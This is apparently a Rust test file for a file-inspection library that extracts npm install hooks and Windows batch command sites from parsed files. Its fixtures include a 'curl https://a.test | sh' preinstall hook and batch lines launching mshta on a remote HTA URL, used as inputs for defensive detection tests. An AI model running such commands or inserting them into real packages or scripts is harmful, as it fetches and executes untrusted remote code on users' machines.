use serde_json::json;

use super::*;
use crate::{FileType, OpenOptions, ParsedFile};

fn open<'a>(name: &str, bytes: &'a [u8]) -> ParsedFile<'a> {
    OpenOptions::new()
        .path(std::path::Path::new(name))
        .rizin(false)
        .open(bytes)
}

fn batch(source: &str) -> ParsedFile<'_> {
    OpenOptions::new()
        .file_type(FileType::Batch)
        .rizin(false)
        .open(source.as_bytes())
}

/// Every view this module offers, owned so two trees can be compared.
fn facts(values: &Values) -> (Option<String>, Vec<(&str, String)>, Vec<String>, bool) {
    (
        basename(values).map(str::to_owned),
        npm_install_hooks(values)
            .map(|(hook, command)| (hook, command.to_owned()))
            .collect(),
        batch_command_sites(values)
            .map(|site| format!("{site:?}"))
            .collect(),
        batch_command_sites_truncated(values),
    )
}

#[test]
fn basename_is_the_name_without_its_directory() {
    let parsed = open("stubs/types.pyi", b"import os\n");
    assert_eq!(basename(parsed.values()), Some("types.pyi"));
    let unnamed = OpenOptions::new().rizin(false).open(b"import os\n");
    assert_eq!(basename(unnamed.values()), None);
}

#[test]
fn npm_install_hooks_are_listed_in_the_order_npm_runs_them() {
    let manifest = br#"{"name": "x", "version": "1.0.0", "scripts": {
        "test": "jest", "postinstall": "node post.js", "install": "node-gyp rebuild",
        "preinstall": "node pre.js", "prepare": "tsc"}}"#;
    let parsed = open("package.json", manifest);
    assert_eq!(
        npm_install_hooks(parsed.values()).collect::<Vec<_>>(),
        [
            ("preinstall", "node pre.js"),
            ("install", "node-gyp rebuild"),
            ("postinstall", "node post.js"),
        ]
    );
    let none = open(
        "package.json",
        br#"{"name": "x", "scripts": {"test": "jest"}}"#,
    );
    assert_eq!(npm_install_hooks(none.values()).count(), 0);
}

#[test]
fn batch_command_sites_match_the_source() {
    let source = "echo ready\r\n@MSHTA.EXE \"https://program.test/a.hta\"\r\n";
    let parsed = batch(source);
    let sites: Vec<_> = batch_command_sites(parsed.values()).collect();
    assert_eq!(sites.len(), 2, "{sites:?}");
    for site in &sites {
        let at = |offset: u64| usize::try_from(offset).unwrap();
        let (offset, start, end) = (at(site.offset), at(site.name_offset), at(site.name_end));
        assert_eq!(&source[offset..offset + site.text.len()], site.text);
        assert_eq!(&source[start..end], site.name);
    }
    assert_eq!(sites[1].name, "MSHTA.EXE");
    assert_eq!(sites[1].text, "@MSHTA.EXE \"https://program.test/a.hta\"");
    assert!(!batch_command_sites_truncated(parsed.values()));
}

#[test]
fn batch_command_site_truncation_is_reported() {
    let source = "mshta https://program.test/a.hta\n".repeat(200);
    let parsed = batch(&source);
    let read = batch_command_sites(parsed.values()).count();
    assert!(read > 0 && read < 200, "{read}");
    assert!(batch_command_sites_truncated(parsed.values()));
}

/// A consumer keeps the values tree as JSON and reads it later without the
/// file: both ways back to a `Values` read exactly what the live view read.
#[test]
fn retained_json_reads_the_same_facts() {
    let manifest = br#"{"name": "x", "scripts": {"preinstall": "curl https://a.test | sh"}}"#;
    let script = "mshta https://program.test/a.hta\n".repeat(200);
    for parsed in [open("package.json", manifest), batch(&script)] {
        let live = facts(parsed.values());
        let text = serde_json::to_string(parsed.values()).unwrap();
        let deserialized: Values = serde_json::from_str(&text).unwrap();
        let rebuilt = Values::from(serde_json::from_str::<Value>(&text).unwrap());
        assert_eq!(facts(&deserialized), live);
        assert_eq!(facts(&rebuilt), live);
        assert_eq!(&rebuilt, parsed.values());
    }
}

#[test]
fn entries_of_the_wrong_shape_are_skipped() {
    let site = json!({"name": "mshta", "text": "mshta x", "offset": 4,
        "name_offset": 4, "name_end": 9});
    let values = Values::from(json!({
        "file": {"basename": 7},
        "npm": {"scripts": {"preinstall": ["sh"], "postinstall": "sh x"}},
        "source": {"batch": {
            "command_sites": ["mshta", {"name": "mshta"}, {"name": "mshta", "text": "mshta x",
                "offset": -1, "name_offset": 0, "name_end": 5}, site],
            "command_sites_truncated": "yes"
        }}
    }));
    assert_eq!(basename(&values), None);
    assert_eq!(
        npm_install_hooks(&values).collect::<Vec<_>>(),
        [("postinstall", "sh x")]
    );
    let sites: Vec<_> = batch_command_sites(&values).collect();
    assert_eq!(
        sites,
        [BatchCommandSite {
            name: "mshta",
            text: "mshta x",
            offset: 4,
            name_offset: 4,
            name_end: 9,
        }]
    );
    assert!(!batch_command_sites_truncated(&values));

    for root in [json!(null), json!([1]), json!({"source": {"batch": 1}})] {
        let values = Values::from(root);
        assert_eq!(facts(&values), (None, Vec::new(), Vec::new(), false));
    }
}
